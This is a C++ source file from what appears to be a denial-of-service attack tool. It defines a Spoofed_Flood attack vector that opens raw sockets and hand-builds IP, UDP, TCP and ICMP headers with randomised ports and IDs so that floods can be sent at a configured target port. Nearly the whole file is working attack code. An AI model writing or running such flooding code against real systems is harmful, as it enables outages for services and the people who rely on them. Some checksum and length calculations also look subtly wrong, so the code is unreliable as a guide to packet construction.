#include <netinet/in.h>
#include <cstring>

#include "../Headers/Spoofed_Flood.hpp"
#include "../Headers/Randomizer.hpp"

Spoofed_Flood::Spoofed_Flood(const config *conf, Logger *logger) : Attack_Vector(conf, logger){

}

unsigned short Spoofed_Flood::csum(unsigned short *buf, int len) {
    unsigned long sum;
    for(sum=0; len>0; len--){
        sum += *buf++;
    }
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int Spoofed_Flood::make_socket(int protocol) {
    int sock, on = 1;
    if((sock = socket(AF_INET, SOCK_RAW, protocol)) == -1){
        logger->Log("socket() error", Logger::Error);
        exit(EXIT_FAILURE);
    }

    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1){
        logger->Log("setsockopt() error", Logger::Error);
        exit(EXIT_FAILURE);
    }
    return sock;
}

void Spoofed_Flood::init_headers(iphdr *ip, udphdr *udp, char *buf) {
    auto s_port = Randomizer::randomPort();
    // IP Struct
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 16;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(buf);
    ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
    ip->frag_off = htons(0x0);
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->check = csum((unsigned short *) buf, ip->tot_len);

    // UDP Struct
    udp->source = htons(static_cast<uint16_t>(s_port));
    udp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
    udp->len = htons(static_cast<uint16_t>(sizeof(struct udphdr)));
    udp->check = 0;
}

void Spoofed_Flood::init_headers(iphdr *ip, tcphdr *tcp, char *buf) {
    auto s_port = Randomizer::randomPort();
    // IP Struct
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 16;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(buf);
    ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
    ip->frag_off = htons(0x0);
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;

    ip->check = csum((unsigned short *) buf, ip->tot_len);

    // TCP Struct
    tcp->source = htons(static_cast<uint16_t>(s_port));
    tcp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
    tcp->seq = 0;
    tcp->ack_seq = 0;
    tcp->doff = 5;  //tcp header size
    tcp->fin=0;
    tcp->syn=0;
    tcp->rst=0;
    tcp->psh=0;
    tcp->ack=0;
    tcp->urg=0;
    tcp->window = htons (5840);
    tcp->check = 0;
    tcp->urg_ptr = 0;
}

void Spoofed_Flood::init_headers(iphdr *ip, icmphdr *icmp, char *buf) {
    // IP Struct
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(buf));
    ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
    ip->frag_off = htons(0x0);
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->check = 0;

    ip->check = csum((unsigned short *) buf, ip->tot_len);

    icmp->type = 0;
    icmp->code = 0;
    icmp->un.echo.sequence = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
    icmp->un.echo.id = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
    icmp->checksum = 0;
}
